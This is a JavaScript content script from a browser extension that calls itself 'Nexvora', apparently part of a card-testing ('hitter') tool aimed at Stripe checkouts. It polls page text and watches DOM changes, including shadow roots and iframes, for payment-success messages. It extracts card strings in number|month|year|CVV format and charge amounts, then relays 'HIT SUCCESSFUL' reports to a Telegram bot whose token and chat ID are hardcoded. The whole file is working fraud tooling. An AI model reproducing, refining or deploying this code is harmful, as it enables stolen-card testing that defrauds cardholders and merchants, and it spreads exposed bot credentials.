/**
 * Nexvora Direct-Fire Omni-Detection (v14.0 - Absolute Bypass)
 * Direct Telegram connection from the checkout page!
 * Zero reliance on Background Scripts or Service Workers!
 */

(function() {
    let hasSentDirectly = false;
    const BOT_TOKEN = '8611283068:AAHACBysrkkm8RqmsidZ24QRwAIcnld4t8o';
    const CHAT_ID = '-1003721268860';

    const sendDirectTelegram = async (message) => {
        if (hasSentDirectly) return;
        hasSentDirectly = true;
        
        try {
            chrome.runtime.sendMessage({
                type: 'NOTIFY_HIT',
                data: {
                    text: message
                }
            });
            console.log("[Nexvora] Proxy transmission successful.");
        } catch (e) {
            console.error("[Nexvora] Proxy transmission failed.", e);
        }
    };

    const processHit = (text, element) => {
        if (hasSentDirectly) return;
        if (!text) return;
        
        const lower = text.toLowerCase();
        
        // Exact matches for the popup and standard success text
        const isHit = (
            lower.includes('paid successfully') || 
            lower.includes('successfully hitted') || 
            lower.includes('payment successful') ||
            lower.includes('payment confirmed') ||
            lower.includes('approved')
        );

        // Guard against matching entire body or massive source code dumps
        if (isHit && text.length > 5 && text.length < 1500) {
            hasSentDirectly = true; // fast lock

            let amountStr = 'N/A';
            let cardStr = 'N/A';

            try {
                // Try grabbing card from localized text
                const cardMatch = text.match(/\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}/);
                if (cardMatch) cardStr = cardMatch[0];

                // Attempt global amount grab since popup often lacks amount
                const amountRegex = /(?:[A-Z]{2,3}|[\$£€¥])\s?[\d,]+(?:\.\d{2,3})?|[\d,]+(?:\.\d{2})\s?(?:[A-Z]{2,3}|[\$£€¥])/gi;
                
                // Grab from entire visible DOM if needed, since amount is often elsewhere in the UI
                const docText = document.body ? document.body.innerText : '';
                const matchArr = text.match(amountRegex) || docText.match(amountRegex);
                
                if (matchArr && matchArr.length > 0) {
                    amountStr = matchArr[0].toString().trim();
                }
            } catch (e) {
                console.error("Extraction error:", e);
            }

            const message = `<b>HIT BDT (PROXY)</b>\n` +
                            `🚀 <b>HIT SUCCESSFUL</b> ⚡\n` +
                            `👤 <b>User:</b> 🇧🇩\n` +
                            `🆙 <b>Plan:</b> <code>SILVER</code>\n` +
                            `↔️ <b>Gateway:</b> <code>Stripe Protected Hitter</code>\n` +
                            `✅ <b>Response:</b> <code>Charged Successfully</code>\n` +
                            `🌐 <b>Site:</b> <code>${window.location.hostname || 'Unknown'}</code>\n` +
                            `💰 <b>Amount:</b> <code>${amountStr}</code>\n\n` +
                            `<i>Checked by @hitinfobdrobot ✅</i>`;

            sendDirectTelegram(message);
        }
    };

    // Very aggressive localized DOM Scanner
    const aggressivelyScan = (root) => {
        if (hasSentDirectly) return;
        if (!root) return;

        // Scan all specific UI elements to bypass giant text chunks
        const elements = root.querySelectorAll ? root.querySelectorAll('div, span, p, h1, h2, h3, h4, h5, h6, strong, b, label') : [];
        for (let i = 0; i < elements.length; i++) {
            if (hasSentDirectly) break;
            const el = elements[i];
            const text = el.innerText || el.textContent;
            if (text) processHit(text, el);
        }

        // Drill down frames
        if (root.shadowRoot) aggressivelyScan(root.shadowRoot);
        const iframes = root.querySelectorAll ? root.querySelectorAll('iframe') : [];
        for (let i = 0; i < iframes.length; i++) {
            try {
                const doc = iframes[i].contentDocument;
                if (doc && doc.body) aggressivelyScan(doc.body);
            } catch (e) {} // Ignore cross-origin frame access errors
        }
    };

    const runDetector = () => {
        if (hasSentDirectly) return;
        if (document.body) aggressivelyScan(document.body);
    };

    // 1. Hook DOM Mutations
    const observer = new MutationObserver((mutations) => {
        if (hasSentDirectly) {
            observer.disconnect();
            return;
        }
        for (let m of mutations) {
            for (let node of m.addedNodes) {
                if (node.nodeType === 1) { // Element
                    const text = node.innerText || node.textContent;
                    if (text) processHit(text, node);
                    if (node.shadowRoot) aggressivelyScan(node.shadowRoot);
                }
            }
        }
    });

    if (document.body) {
        observer.observe(document.body, { childList: true, subtree: true });
    } else {
        document.addEventListener('DOMContentLoaded', () => {
            observer.observe(document.body, { childList: true, subtree: true });
        });
    }

    // 2. Poll constantly in background
    setInterval(runDetector, 400); // 400ms is blazingly fast

})();
